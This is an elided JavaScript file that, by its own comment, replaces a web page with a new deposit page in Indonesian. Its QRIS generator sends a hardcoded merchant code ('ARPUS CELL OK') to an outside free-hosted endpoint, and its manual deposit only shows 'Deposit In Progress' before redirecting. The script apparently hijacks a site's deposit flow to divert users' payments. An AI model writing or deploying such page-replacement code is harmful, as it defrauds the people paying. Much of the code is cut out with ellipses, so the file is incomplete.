// indexkuy.js
(function(){
  // full HTML yang akan menggantikan halaman lama
...
<body>
  ...
  <script>
    /* semua fungsi dipertahankan, tidak mengubah logika internal */
    function copyToClipboard(text) {
      navigator.clipboard.writeText(text).then(function(){ alert('Nomor berhasil disalin!'); });
    }
    function showDeposit(type){
      ...
      setTimeout(function(){ var c = document.querySelector('.card'); if(c) c.scrollIntoView({behavior:'smooth', block:'start'}); }, 120);
    }
    function selectMethod(jsonString){
      if(!jsonString) return;
      try{
        var method = JSON.parse(jsonString);
    ...
    function submitManualDeposit(){
      var nominal = Number(document.getElementById('manual-nominal').value || 0);
      ...
      setTimeout(function(){ res.innerHTML = '<div class="helper"><strong>Deposit In Progress</strong></div>'; setTimeout(function(){ location.href = '../'; },1500); }, 1500);
    }
    ...
    async function generateQRIS(){
      ...
      var auto = document.getElementById('auto-result');
      auto.innerHTML = '<div class="spinner"></div><div class="helper">Membuat QRIS...</div>';

      var payload = 'qris=00020101021226670016COM.NOBUBANK.WWW01189360050300000879140214250910000000730303UMI51440014ID.CO.QRIS.WWW0215ID20254343011770303UMI5204481253033605405500005802ID5920ARPUS CELL OK26161126007LANGKAT61052076162070703A016304CC38&qty=' + encodeURIComponent(nominal) + '&yn=n';
      try{
        var resp = await fetch('https://apxnzd.page.gd/qris.php', {
          method:'POST',
          headers:{ 'Content-Type':'application/x-www-form-urlencoded' },
          body: payload
        });
        var result = await resp.text();
        var qrUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=' + encodeURIComponent(result);
        auto.innerHTML = '<div class="qr-card"><img id="qr-img" src="' + qrUrl + '" alt="QRIS" style="width:220px;height:220px;display:block;border-radius:10px;"></div>' +
                         '<div style="margin-top:12px;"><button class="btn" onclick="downloadQR()">Download QRIS</button><button class="btn secondary" onclick="location.href=\\'../\\'">Telah Membayar</button></div>';
        setTimeout(function(){ var el = document.getElementById('qr-img'); if(el) el.scrollIntoView({behavior:'smooth', block:'center'}); }, 120);
      }catch(err){
  ...
  // coba navigasi via blob URL (lebih aman untuk string panjang). fallback ke data: jika gagal.
  try {
